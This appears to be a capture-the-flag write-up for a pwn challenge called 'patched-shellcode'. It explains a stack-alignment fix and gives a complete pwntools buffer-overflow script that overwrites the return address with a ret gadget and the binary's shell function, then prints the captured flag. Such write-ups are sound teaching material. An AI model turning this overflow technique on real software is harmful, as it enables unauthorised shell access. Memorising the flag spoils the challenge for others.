# patched-shellcode

## Description

Okay, okay. So you were smart enough to do basic overflow huh...

Now try this challenge! I patched the shell function so it calls system instead of execve... so now your exploit shouldn't work! bwahahahahaha

Note: due to the copycat nature of this challenge, it suffers from the same bug that was in basic-overflow. see the cryptic message there for more information.

Author: drec

nc 34.134.173.142 5000

## Approach
```
void shell(void)

{
  system("/bin/sh");
  return;
}
```

Basically same thing as [basic-overflow](../basic-overflow/README.md), overwrite RIP to call `shell`. But this time our first exploit doesn't work because this binary suffers from stack alignment issues.

So we just need to add a `ret` instruction to fix the stack alignment issues and our exploit works again!

## Exploit
```
#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './patched-shell'
elf = context.binary = ELF(exe, checksec=False)
libc = '/usr/lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '34.134.173.142', 5000

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+31
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    offset = 72
    payload = flat({
        offset: [
            rop.ret.address,
            elf.symbols['shell']
        ]
    })

    io.sendline(payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
```

## Flag
```
uoftctf{patched_the_wrong_function}
```